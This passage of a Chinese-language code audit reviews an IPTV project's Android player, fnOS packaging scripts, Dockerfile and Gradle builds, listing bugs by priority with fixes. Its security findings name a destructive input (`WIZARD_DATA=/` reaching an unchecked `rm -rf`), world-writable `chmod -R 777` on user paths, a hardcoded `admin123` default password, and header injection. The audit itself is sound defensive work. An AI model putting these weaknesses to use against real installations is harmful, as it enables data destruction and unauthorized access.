| `Av3aHlsExtractorFactory.kt:42-65` | 每个 HLS 分片都构造完整 `TsExtractor` + sniff，非 TS（fMP4）分片白白构造后丢弃，然后 delegate 再检测一遍 | 先用 564 字节 scratch buffer 检查 0/188/376 位置的 TS 同步字节，再决定是否构造；按 uri 记住「非 TS」 |
| `ExoEngine.kt:482-495` | `.mpd` 落到 `ProgressiveMediaSource`（`CONTENT_TYPE_DASH` 走了 else 分支），而 class KDoc 声称支持 DASH，`build.gradle.kts` 里也没有 `media3-exoplayer-dash` | 要么加依赖 + `DashMediaSource` 分支，要么改 KDoc 并对不支持的 contentType 明确报错 |
| `ExoEngine.kt:656-685` | `setAdaptiveBitrate` / `selectVideoTrack` 是死代码，且每次 `setSource()` 的 `applyQualityPreference()` 都会把它们的效果覆盖掉（R8 的 `usage.txt` 已确认无调用点被移除） | 用字段保存期望模式，在 `applyQualityPreference()` 里统一重建参数；或直接删掉这两个方法 |
| `Av3aReader.kt:44-53, 61-76` | PES 无 PTS 时 `timeUs = TIME_UNSET`，`consume` 仍 `sampleData` 追加字节，但 `packetFinished` 不会 `sampleMetadata` → 这些字节被并入下一个 sample，采样边界与音画同步漂移；另外发出的 `Format` 没有 `sampleRate`/`channelCount` | `timeUs == TIME_UNSET` 时丢弃该包或按前一包 PTS + 1024 采样推算；从 AVS3 帧头解析填入采样率/声道数 |
| `AndroidManifest.xml:20, 53-62` | `allowBackup="true"` 会把含设备 token 的 `media_iptv_prefs` 备份出去；`BootReceiver` 是 `exported="true"`（系统广播其实不需要） | `allowBackup="false"`；receiver 改 `exported="false"` |

## P2 Android 低优先级

- `MainActivity.kt:86-87`：`currentEpgPrograms` 与 `currentCatchupSegment` 只写不读（死字段）
- `App.kt:48`：`lowResolutionChannelLogo()` 从未被调用，`ChannelAdapter` 自己内联了 `.override(128,128)`，导致这里配的 placeholder/`DiskCacheStrategy.ALL` 全部丢失
- `MainActivity.kt:739-769`：10 分钟刷新只更新 OSD，不更新频道列表行的节目名（与 `loadEpgForChannel` 的 `channelAdapter.updateCurrentProgram` 不一致）
- `MainActivity.kt:609-615`：心跳把 `config` 解析出来后 `applyEngineConfig()` 又只读本地 `Prefs`，服务端下发的 `PlayerConfig` 实际被忽略——每分钟一次无意义的主线程派发
- `MainActivity.kt:208-221`：冷启动「预热连接」发的是完整 GET 到 `/stream/live/...`，服务端会真的去拉一路上游流然后被立刻断开
- `MainActivity.kt:413-432`：`reportResolution` 每次 `onVideoSizeChanged` 都发
- `EpgAdapter.kt:145-164`：每次 bind 都 `ContextCompat.getColor()`；`submitPrograms` 里两次 `filter` + `asReversed()`
- `IjkEngine.kt:293-301`：`ensureModelPath()` 在换台路径上做 `assets.open` + 文件复制（79 KB，不大但在主线程）
- `SystemEngine.kt:29/34/41`：`surfaceReady` 只写不读；`videoWidth/Height` 不按源重置，`applyScaleMode()` 会短暂用上一频道的尺寸
- `ExoEngine.kt:687-691`：`release()` 里 `player.stop()` 是多余的（`release()` 内部已 stop）；`playerView.player` 与各 listener lambda 未置空
- `ExoEngine.kt:402-403`：`inflate(layout, null)` 传 null root 会丢弃布局里的 `match_parent`，目前靠外层 `FrameLayout` 的默认 LayoutParams 侥幸撑满——改成 `inflate(..., null, false)` + 显式 `FrameLayout.LayoutParams(MATCH_PARENT, MATCH_PARENT)`
- `ExoEngine.kt:355-387`：stall monitor 全生命周期每 2 秒唤醒主线程（暂停时也唤醒）。不是泄漏（`release()` 有清），但 TV 盒子本该空闲
- `App.kt:33-41` vs `ExoEngine.kt:114`：预热是竞态而非保证——预热线程还在 `System.loadLibrary` 时主线程构造 `ExoEngine` 会阻塞在同一个类初始化锁上
- `model/ApiModels.kt:128`：`CatchupDaysData` 声明 `@Json(name = "dates")`，而服务端 `client.js:204` 返回的是 `days` → 字段永远解析为空。目前 `catchupDays()` 无调用方（死代码），但一旦接线就会静默失效
- `MainActivity.kt:1160-1172` 与 `ExoEngine.kt:439-446`：进度更新有两套来源（轮询 + 引擎回调），可只保留一套

---

# 三、打包与构建 `fpk/` + Docker + Gradle

## P0 打包/构建

| 位置 | 问题 | 建议 |
|---|---|---|
| `fpk/package/cmd/main:139-170` | **`main start` 永远 `exit 0`**，即使 `fail()` 已经 `return 1`。fnOS 靠退出码判断安装/启动成功 → Node 运行时缺失或 2 秒内崩溃都会被报告为「成功」 | `start) start_process \|\| exit 1 ;;`，`stop` 同理 |
| `fpk/build.sh:10-12, 49-51` | `fpk/package/manifest` 是 **CRLF**（已确认），`awk -F=` 取到的值带 `\r`，`xargs` 不删 `\r` → `OUTFILE` 含回车 → 第 50 行 `[ -f "mediaiptv\r.fpk" ]` 永远不成立（静默跳过重命名），第 51 行仍打印「Build Complete」。真正的产物仍是 `mediaiptv.fpk` | 解析时 `tr -d '\r'`；结尾 `[ -f "$OUTFILE" ] \|\| { echo FAILED; exit 1; }`；把 manifest 规范化为 LF 并加 `.gitattributes` |
| `fpk/build.ps1:67-75` | 不检查 `$LASTEXITCODE`（`$ErrorActionPreference` 管不到原生命令退出码）→ fnpack 失败时会把**上一次构建残留的** `mediaiptv.fpk` 改名成本次版本号并打印 Done，等于发旧包 | 检查 `$LASTEXITCODE` 并 `throw`；先删 `$raw`/`$out`；断言产物存在 |
| `fpk/package/cmd/install_callback:33-37` | `chmod -R 777 "${wizard_data}"`，而 `wizard_data` 是安装向导的**自由文本**（只校验非空）。输错成 `/` 或 `/vol1` 就是整个卷递归开放写权限；`mkdir -p` 也会创建任意目录。这与 `config/privilege` 声明的 `"run-as": "package"` 自相矛盾 | 校验路径前缀（`/vol[0-9]*/*`），用 `install -d -m 0750 -o <pkg-user>` 建目录，绝不 `chmod -R 777` |
| `fpk/package/cmd/uninstall_callback:18-25` | 从状态文件读取路径后 `rm -rf`，无校验。`-n` + `-d` 挡不住 `WIZARD_DATA=/` | 前缀白名单 + 最小层级 + 拒绝挂载点 |
| `fpk/package/cmd/main:81-82` | `DATA_DIR` 默认就是 `${TRIM_PKGVAR}/data`，第 81 行刚把它建成**真实目录**，第 82 行 `ln -sfn "${DATA_DIR}" "${TRIM_PKGVAR}/data"` 于是在目录里创建 `data/data -> data` 自引用软链。`tar -czf`、`du -sh`、`rsync -L`、`find -L` 会死循环 | 直接删掉第 82 行（进程已经通过 `DATA_DIR=` 环境变量拿到路径，软链毫无作用） |
| `fpk/build.sh:16-32` | 只 chmod 了 Node 运行时。`package/cmd/*`（fnOS 实际执行的入口）、`wizard/*`、`config/*`、`app/ui/index.cgi` 的可执行位从未强制设置。`pack.js` 在 Windows 侧补偿了，但 fnpack 路径完全依赖磁盘 mode 位 | 打包前显式 `chmod 755 cmd/* wizard/* config/* app/ui/*.cgi` 并断言 `[ -x ]` |
| `fpk/build.ps1` 全篇 | **从不调用 `pack.js`**（仓库里唯一能在 Windows 上保留 Unix 可执行位的工具）。走 `fnpack.exe` 分支会复现上面的 mode 位问题；走 else 分支只是打印「请在 WSL 里构建」 | 让 `pack.js` 成为 Windows 默认打包器：`node pack.js package "mediaiptv_all_v$Version.fpk"` |
| `fpk/build.sh:28, 45` | `curl -sL` 无 `-f`（404 的错误页会被当成 tarball 写入），且 **Node 运行时与 fnpack 二进制都没有 SHA-256 校验**就直接 `chmod +x` 执行 | `curl -fsSL`；用 `SHASUMS256.txt` 校验 Node；fnpack 固定哈希；`trap 'rm -rf "$TMP"' EXIT` |
| `server/Dockerfile:8-11` | 有 `package-lock.json`（46 KB）却没 `COPY`，用的是 `npm install` 而非 `npm ci` → 每次构建重新解析 semver，镜像不可复现 | `COPY package.json package-lock.json ./` + `RUN npm ci --omit=dev` |
| `server/Dockerfile:1-19` | 无 `USER`，服务端 / ffmpeg / SQLite 全以 **root** 运行；未设 `NODE_ENV=production` → Express 会在错误响应里**返回堆栈**给局域网内任何客户端 | `ENV NODE_ENV=production`、`RUN chown -R node:node /app`、`USER node`、`COPY --chown=node:node`；加 `HEALTHCHECK` |
| `android/app/build.gradle.kts:23-35` | **没有 signingConfig，release APK 是未签名的**（磁盘上确认：`app-release-unsigned.apk`）→ 无法安装、无法上架 | 加 `signingConfigs`，密钥放 `~/.gradle/gradle.properties`（仓库里没有 `.gitignore`，绝不能提交） |
| `fpk/package/wizard/install:33` + `install_callback:30` + `server/src/db.js:150` | 默认管理员密码 `admin123` 硬编码在三处；`db.js` 在 `ADMIN_PASSWORD` 缺失/为空时回退到更弱的 `admin`。密码明文存于 `${TRIM_PKGVAR}/admin_password`（默认 umask → 0644，全局可读） | 去掉向导的 `initValue`；`install_callback` 拒绝空密码；`db.js` 改为 fail-closed（随机密码打印一次或拒绝启动）；`umask 077` + `chmod 600` |

## P1 打包/构建

| 位置 | 问题 | 建议 |
|---|---|---|
| `fpk/package/cmd/main:111-137` + `server/src/index.js` | `kill "${pid}"` 只杀单个 PID，不杀进程组；服务端无 SIGTERM handler → ffmpeg 录制进程变孤儿（详见服务端 P1-2） | `setsid` 启动 + `kill -TERM -"${pid}"` |
| `fpk/package/cmd/main:45-54` | PID 文件残留 + PID 复用：崩溃后 PID 文件仍在，若该 PID 被别的进程复用，`status` 永远返回 0，`start` 直接短路（57-59）→ 应用永远起不来 | 校验 `/proc/${pid}/cmdline` 含 mediaiptv，或改用 `flock` |
| `fpk/package/cmd/main:61-62, 96, 101-107` | 第一条 `log_msg`（61）在 `mkdir -p`（62）**之前**，全新安装时第一行日志丢失（`stop_process` 连 mkdir 都没有）；`cd "${APP_DIR}"` 未检查；`sleep 2` 是唯一的存活判据 | 先 mkdir；检查 `cd`；用 `curl -sf http://127.0.0.1:$PORT/` 轮询替代固定 sleep |
| `fpk/package/app/ui/index.cgi:4` | 硬编码 `/var/apps/mediaiptv/var/server_port`，**完全忽略 `TRIM_PKGVAR`**（其他 cmd/* 都做了 fallback）→ 非默认布局下读到默认端口，桌面图标指向错误地址。而且这个文件根本没被引用（真正的启动项是 `app/ui/config` 里的 `.url` 条目） | 补上 TRIM_PKGVAR fallback，或直接删除该死文件 |
| `fpk/package/app/ui/index.cgi:7-10` | 客户端可控的 `HTTP_HOST` 未校验就拼进 `Location:` 响应头 → 响应头注入 / 开放重定向；`cut -d: -f1` 还会截坏 IPv6 | 用相对 URL 重定向，或对 HOST 做字符白名单 |
| `fpk/package/app/ui/config:8` | `"port": "${server_port}"` 在 `i18n/zh-CN` 与 `en-US` 里**都没有对应键**（已 grep 确认）→ 图标端口很可能渲染成字面量 | 确认 fnOS 是否替换；否则硬编码默认值并让 `index.cgi` 动态查端口 |
| `fpk/package/cmd/config_callback:15-27` | 端口只校验 `^[0-9]*$`（`wizard/config:16`），`0`/`99999`/空串都能通过 → `config.js:15` 的 `parseInt` 得到 `NaN`；密码明文写入；`echo` 结果未检查；`main restart` 的退出码被丢弃（28 行 `exit 0`） | 校验 `1..65535`；`umask 077`；写失败 `\|\| exit 1`；透传 restart 结果 |
| `fpk/package/cmd/upgrade_callback:1-5` | 升级重启但不重新应用可执行位 → 新版 `node_*` / `ui/*.cgi` 以 0644 到达时无法执行 | 把 install_callback 的 chmod 块抽成共享脚本，升级时也调用 |
| `fpk/pack.js:68-86, 124-126` | 全量内存打包：每个文件读进 `chunks` → `Buffer.concat` → `gzipSync(level:9)`；两个 ~110 MB 的 Node 二进制 + node_modules → 峰值 250 MB+ 常驻 + gzip 输出，且完全同步。另外没有预检（缺 Node 运行时也能打包成功，装到 NAS 上才失败）；`mtime` 用 `Date.now()` → 产物不可复现；不输出 SHA-256 | 预检必需文件；改 `zlib.createGzip()` + `fs.createWriteStream` 流式打包；`mtime` 固定为 `SOURCE_DATE_EPOCH`；打印产物 sha256；排除 `node_modules/.bin` |
| `android/app/build.gradle.kts:18-20` | 两个 ABI 打进同一个 APK：arm64 21.7 MB + v7a 15.0 MB ≈ 36.7 MB 原生库，每台设备一半是死的。无 `splits`、无 `bundle` | 优先 AAB；或 `splits { abi { isEnable = true; reset(); include("arm64-v8a","armeabi-v7a"); isUniversalApk = false } }`。另建议确认 `libSennheiserAmbeoDecoder.so`（2.44 MB）是否真被加载——全仓库只有 `System.loadLibrary("wsrtcsdk")` 和 `"RtsSDK"` |
| `android/app/proguard-rules.pro:19, 23` | `-keep class androidx.media3.** { *; }` 和 `-keep class kotlin.** { *; }` 把整个库（含反射专用内部类）都保住了，基本抵消了 `build.gradle.kts:25-26` 刚打开的 `isMinifyEnabled` / `isShrinkResources`。两个库都自带 consumer rules | 删掉 23 行；19 行收窄到真正需要反射的部分；用已有的 `build/outputs/mapping/release/{mapping,usage}.txt` 做前后对比 |
| `android/app/build.gradle.kts:84-86` + `net/ApiClient.kt:24` | 所有 model 都标了 `@JsonClass(generateAdapter = true)`，同时又注册了 `KotlinJsonAdapterFactory()`（反射路径）。后者是死重量，也是 R8/Moshi 最容易出问题的地方（所以才需要 `proguard-rules.pro:9` 的 keepnames） | 移除 `moshi-kotlin` 依赖与工厂注册，只保留 `moshi` + KSP codegen；相应简化 proguard 规则 |
| `android/app/build.gradle.kts:11-21` | 未设 `resourceConfigurations`，而 `res/` 只有 `values`（无 `values-zh`）→ AndroidX/Media3 的几十种语言资源全部打进包 | `resourceConfigurations += listOf("zh", "en")` |
| `android/build.gradle.kts:2` + `app/build.gradle.kts:9` | AGP 8.2.2 配 `compileSdk = 35`——8.2.x 官方只测到 API 34（首个正式支持 35 的是 AGP 8.6）。目前能编过，但下次依赖升级就会炸 | 升到 AGP ≥ 8.7 并同步 Gradle wrapper（当前 8.7）与 Kotlin/KSP |
| 三处版本号 | `app/build.gradle.kts:16` = `1.2.3`，`fpk/package/manifest:2` = `1.2.4`，`server/package.json` = `1.0.0`，无任何同步机制 | 单一来源（`version.properties`），Gradle 与 manifest 都从它读 |
| 仓库卫生 | **全仓库没有 `.gitignore`**（也没有 `.git`），而工作区里躺着 `app-debug.apk` 31.2 MB、`app-release-unsigned.apk` 24.7 MB、`mapping.txt` 9.3 MB、`seeds.txt` 7.2 MB、`usage.txt` 1.6 MB、`server/node_modules` 9.3 MB、`android/.gradle`、`app/build/*`。`local.properties` 里是 `sdk.dir=C:\Dev\android-sdk` | 加 `.gitignore`（`node_modules/`、`build/`、`.gradle/`、`local.properties`、`data/`、`*.fpk`、`fpk/package/app/server/`、`*.log`、`.env*`）+ 一个 `clean` 目标 |
| `server/.dockerignore:1-8` | 没有 `.env` / `.env.*` 条目。今天没有 `.env`（已确认），但 `COPY . .` 会把将来任何一个 `.env` 直接烤进可分发镜像层 | 补 `.env*`、`*.pem`、`*.key`、`test/`、`.vscode/`、`.idea/` |
| `android/gradle.properties` | 未开 `org.gradle.configuration-cache=true`；无签名相关属性 | 开启配置缓存；签名属性放 `~/.gradle/gradle.properties` |

## P2 打包/构建

- `fpk/build.sh:41-42`：`elif [[ -x "./fnpack.exe" ]]` 在 Linux 上执行 Windows PE，只会失败，删掉
- `fpk/build.ps1:8` 与 `build.sh:8` 各自硬编码 `v24.9.0`，没有共同来源 → 两条构建路径可能发出不同 Node 版本
- `fpk/package/manifest:5,8,10`：`platform = all` 意味着每个包都带两份 Node 运行时（约 90 MB 冗余）；`maintainer_url`/`distributor_url` 还是 `github.com/example/mediaiptv` 占位符
- `fpk/package/config/resource:1` 是 `{}`：未声明内存/CPU 上限，失控的 ffmpeg 录制可以吃光 NAS
- `fpk/package/cmd/main:29-33`：`info.log` 无轮转（每次启停 2 行 + 服务端全部 stdout），长期录制会撑满系统盘
- `server/Dockerfile:17`：`EXPOSE 9527` 硬编码，而端口可通过 `PORT` 配置
- `android/app/build.gradle.kts:32-34`：debug 没有 `applicationIdSuffix`，debug/release 无法共存
- `fpk/pack.js:31-35`：`shortName.slice(0, 99)` 不是按字节切，且用 `'ascii'` 写入会丢高位——对 CJK 文件名（UTF-8 3 字节/字）会产生畸形的 header 字段。虽然同时会发出 GNU `@LongLink`（合规解包器能恢复真实名），仍建议按字节切

---

# 四、建议的修复顺序

按「风险 × 收益 / 改动量」排序：

**第一批（强烈建议立刻做，合计约 100 行改动）**
1. 订阅刷新级联删除录制任务（服务端 P0-1）——**唯一会丢用户数据的问题**
2. 补 5 个索引（服务端 P1-1）——5 行 SQL 换 350 倍
3. 访问日志用 `req.originalUrl`（服务端 P1-3）——3 行
4. 后台 XSS 改 `data-*` 事件委托（服务端 P0-4）
5. `main start` 退出码 + manifest CRLF + fnpack 退出码（打包 P0）——发布流程目前会发错包

**第二批（需要一点设计决策）**

6. EPG 解析移入 `worker_threads` + 异步 gunzip（服务端 P0-2）——影响面最大的性能问题
7. `/stream/*` 加签名鉴权（服务端 P0-3）——需要同步改 `client.js` 下发逻辑，但客户端零改动
8. 管理员密码改 scrypt + 兼容迁移（服务端 P1-4）；环境变量不再覆盖（服务端 P1-5）
9. 优雅退出 + 进程组杀 ffmpeg（服务端 P1-2 + 打包）
10. OSD 统计行的主线程 I/O（Android P0-1）；JSON 解析移出主线程（Android P0-2）

**第三批（体验与体积优化）**

11. Handler 回调清理与进度轮询 Job（Android P0-3 / P0-4）
12. `SystemEngine` 缩放修复（Android P1，功能实际失效）
13. ijk 库预热、`setSource` 状态重置、换台 O(1) 查找（Android P1）
14. 签名配置、ABI 拆分、ProGuard 收窄、去掉 moshi-kotlin（构建 P0/P1）
15. `.gitignore` + `clean` 目标（仓库卫生）

---

## 附：本次审查中确认「不是问题」的点（避免误改）

- `parseM3U` 用 `lastIndexOf(',')` 切分 `#EXTINF` 是正确的——属性值里含逗号时也能正确取到频道名
- `stream.js:73-76` 与 `admin.js:661-663` 的目录穿越防护（`path.resolve` + `startsWith`）写法正确
- `/epg/now` 里 `GROUP BY c.id HAVING p.start = MIN(p.start)` 依赖 SQLite 的 bare-column + 单 min/max 特例，结果**是正确的**（只是可读性差，可换成窗口函数）
- 服务端全部依赖（axios / dayjs / express / multer / node-cron / xml2js）都是纯 JS，`build.ps1` 在 Windows 上 `npm install` 不会带入原生二进制
- `fpk/package/config/privilege` 的 `"run-as": "package"` 正确（非 root）
- `proguard-rules.pro:27-32` 对 `tv/danmaku/ijk/**`、`com/wangsu/**`、`com/aliyun/rts/**` 的 keep **是必要的**（这些是 vendored 源码 + JNI），不要删
- ijk 不在 `build.gradle.kts` 里是**有意为之**：Java 源码 vendored 在 `app/src/main/java/tv/danmaku/`，`.so` 在 `jniLibs`
- Android 端其余 API 字段名与服务端全部对得上（`Channel` / `SourceUrl` / `ChannelGroup` / `Program` / `CatchupSegment` / `EpgNowData` / `PlayerConfig` 都一致），唯一不匹配的是上面点出的 `CatchupDaysData.dates` vs 服务端 `days`（且该接口当前无调用方）
- `buildConfig = true` 是必需的（`SettingsActivity.kt:12` 用了 `BuildConfig`）；Glide、recyclerview、moshi-codegen 都确实在用
- 服务端 env 契约一致：`cmd/main:97` 导出 `DATA_DIR`/`PORT`/`ADMIN_PASSWORD`，`config.js:10-15` 正好读这三个
- `fpk/pack.js` 的可执行位判定（`EXEC_FILES` / `EXEC_DIRS` / `.cgi`）内外两层视角都覆盖正确
- `server/src/services/epg.js:90-91` 输出 `HH:mm:ss`，与客户端 `MainActivity.kt:709` / `EpgAdapter.kt:80-89` 的字符串比较一致
